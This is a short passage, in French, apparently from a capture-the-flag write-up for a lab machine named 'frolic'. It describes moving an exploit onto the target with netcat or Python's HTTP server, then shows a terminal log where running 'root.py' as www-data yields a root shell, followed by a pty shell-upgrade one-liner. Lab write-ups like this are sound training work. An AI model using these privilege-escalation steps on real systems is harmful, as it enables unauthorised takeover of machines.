Vous pouvez très bien transférer avec netcat ou bien SimpleHTTPServer avec python mais bon personnellement j'ai utilisé python pour le transfert de fichier. Une fois que c'est transférer vous avez juste à exécuter le script et vous êtes root.

    www-data@frolic:/tmp$ python root.py
    # id
    uid=0(root) gid=33(www-data) groups=33(www-data)
    # wc -c /root/root.txt
    33 /root/root.txt
    # python -c "import pty;pty.spawn('/bin/bash')"
    root@frolic:/tmp# wc -c /root/root.txt
    33 /root/root.txt
    root@frolic:/tmp#
